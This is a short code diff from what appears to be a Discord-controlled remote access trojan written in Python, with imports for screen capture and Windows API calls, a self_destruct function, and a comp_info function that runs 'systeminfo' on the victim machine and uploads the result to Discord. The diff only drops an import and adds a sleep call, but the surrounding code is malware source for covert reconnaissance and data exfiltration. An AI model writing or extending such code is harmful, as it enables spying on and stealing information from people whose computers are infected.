@@ -1,5 +1,4 @@
 import os
-import registry_handler as reg
 from PIL import ImageGrab
 from ctypes import windll
 from ctypes import c_int
@@ -34,6 +33,7 @@ def self_destruct():
 
 def comp_info():
   os.popen("systeminfo > pc_info.txt")
+  sleep(5)
   embed = discord.Embed(title="Computer Information",description="Result uploaded.", color=0x00ff00)
   file_out = discord.File("pc_info.txt", filename="pc_info.txt")
   return embed, file_out
